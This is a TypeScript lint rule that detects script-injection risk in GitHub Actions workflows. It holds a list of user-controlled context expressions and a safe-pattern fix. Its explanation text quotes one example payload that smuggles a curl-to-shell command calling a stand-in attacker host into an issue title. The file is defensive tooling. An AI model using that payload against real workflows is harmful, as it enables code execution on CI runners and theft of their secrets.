/**
 * GA-C005: Script injection risk
 *
 * Flags `run:` blocks that directly interpolate dangerous GitHub context
 * expressions like `${{ github.event.issue.title }}`. These values are
 * controlled by external users and can inject arbitrary shell commands
 * when used directly in run scripts.
 *
 * The safe pattern is to assign the value to an environment variable
 * first, then reference the env var in the script.
 */

import { getNodeLine } from '../../parser';
import type { GhaLintRule, GhaRuleContext, GhaRuleViolation } from '../../types';
import { forEachRunNode } from './ast-helpers';

/**
 * Exhaustive list of dangerous GitHub context expressions that are
 * controlled by external users.
 *
 * Source: GitHub docs on script injections + actionlint untrusted input list
 */
const DANGEROUS_CONTEXTS = [
  'github.event.issue.title',
  'github.event.issue.body',
  'github.event.pull_request.title',
  'github.event.pull_request.body',
  'github.event.pull_request.head.ref',
  'github.event.pull_request.head.label',
  'github.event.pull_request.head.repo.default_branch',
  'github.event.comment.body',
  'github.event.review.body',
  'github.event.review_comment.body',
  'github.event.pages.*.page_name',
  'github.event.commits.*.message',
  'github.event.commits.*.author.email',
  'github.event.commits.*.author.name',
  'github.event.head_commit.message',
  'github.event.head_commit.author.email',
  'github.event.head_commit.author.name',
  'github.head_ref',
];

/**
 * Build regex from dangerous contexts.
 * Escapes dots and replaces wildcards (*) with \w+ to match array indices.
 */
const INJECTION_RE = new RegExp(
  '\\$\\{\\{\\s*(' +
    DANGEROUS_CONTEXTS.map((c) =>
      c.replace(/\./g, '\\.').replace(/\*/g, '\\w+'),
    ).join('|') +
    ')\\s*\\}\\}',
  'g',
);

export const GAC005: GhaLintRule = {
  id: 'GA-C005',
  title: 'Script injection risk',
  severity: 'warning',
  category: 'security',
  explanation:
    'Directly interpolating user-controlled GitHub context expressions like ' +
    '`${{ github.event.issue.title }}` in `run:` blocks allows script injection. ' +
    'An attacker can craft an issue title containing shell metacharacters ' +
    '(e.g., `"; curl attacker.com/steal | sh #`) to execute arbitrary commands ' +
    'in the workflow runner.',
  fix: {
    description: 'Assign the context value to an environment variable first',
    beforeCode: 'run: echo "${{ github.event.issue.title }}"',
    afterCode:
      'env:\n  TITLE: ${{ github.event.issue.title }}\nrun: echo "$TITLE"',
  },

  check(ctx: GhaRuleContext): GhaRuleViolation[] {
    const violations: GhaRuleViolation[] = [];

    forEachRunNode(ctx, (runValue, node) => {
      // Reset regex lastIndex for global regex
      INJECTION_RE.lastIndex = 0;

      let match: RegExpExecArray | null;
      while ((match = INJECTION_RE.exec(runValue)) !== null) {
        const pos = getNodeLine(node, ctx.lineCounter);
        violations.push({
          ruleId: 'GA-C005',
          line: pos.line,
          column: pos.col,
          message: `Script injection risk: \`\${{ ${match[1]} }}\` is user-controlled and should not be interpolated directly in a run: block. Use an intermediate environment variable instead.`,
        });
      }
    });

    return violations;
  },
};
